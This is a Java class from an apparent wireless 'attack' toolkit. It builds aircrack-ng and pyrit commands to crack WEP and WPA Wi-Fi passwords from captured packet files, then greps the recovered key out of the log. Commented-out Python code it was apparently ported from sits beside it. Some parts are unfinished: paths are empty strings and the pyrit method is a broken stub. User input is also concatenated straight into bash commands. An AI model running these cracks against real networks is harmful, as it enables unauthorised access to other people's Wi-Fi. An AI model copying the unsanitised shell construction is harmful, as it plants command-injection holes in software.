package avatar.wireless.testing.ataque;

import avatar.wireless.testing.Shell;
import java.io.IOException;

public class Cracking {

    Shell shell = new Shell();

    public Cracking() {
    }

    public void wepCracking(String Bssidvic) throws IOException {
        /*
        wep cracking
        cuando se capturen mas de 5000 # datas, se puede instentar crackear las password wep
        # Aircrack decript WEP password
         */
        String config_dir = "";
        String command = "aircrack-ng -z -b " + Bssidvic + " " + config_dir + "*.cap | tee " + config_dir + "aircrack-log.txt";
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";

        shell.ExecuteCommandString(cmd);

    }

    public String SaveWepPasswd() throws IOException {
        String aircrack_log = "";

        String cmd = "cat " + aircrack_log + " | grep 'KEY FOUND' | tr '[]' '\n' | egrep '([a-fA-F0-9]:)+' | tr -d ' \t'";
        String key = shell.ExecuteToString(cmd);

        return key;
    }

    public void NormalWpaCrack() throws IOException {
        /*
    # Crack WPA password dictionary
    #
    def slot_crack_wpa_aircrack(self):
        if self.check_options(self.ac_opt | self.dfile_opt) == 0:
            pass
        else:
            command = 'aircrack-ng -w ' + self.dfile + ' -b ' + self.ac + ' ' + config_dir + '*.cap | tee ' + config_dir + 'aircrack-log.txt'
            ct = Command_thread(command, True, self.add_key_to_database)
            ct.start()

            self.direct_output("Cracking WPA password with dictionary launched (remember to save database's changes)")
         */
        String self_dfile = "";
        String self_ac = "";
        String config_dir = "";

        String command = "aircrack-ng -w " + self_dfile + " -b " + self_ac + " " + config_dir + "*.cap | tee " + config_dir + "aircrack-log.txt";
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

    public void PyritWpaCrack() {
        /*
# Crack WPA password pyrit

    def slot_crack_wpa_pyrit(self):
        if self.check_options(self.essid_opt | self.dfile2_opt) == 0:
            pass
        else:
            command = 'pyrit -e "' + self.essid + '" -i "' + self.dfile2 + '" -r "' + config_dir + '*.cap" attack_passthrough'
            ct = Command_thread(command)
            ct.start()

            self.direct_output('Cracking WPA password with pyrit launched')
         */
        String self_essid = "";
        String self_dfil2 = "";
        String config_dir = "";

        //String command = "pyrit -e " + self.essid + " -i " + self.dfile2 + " -r " + config_dir + "*.cap" attack_passthroug;
    }

}
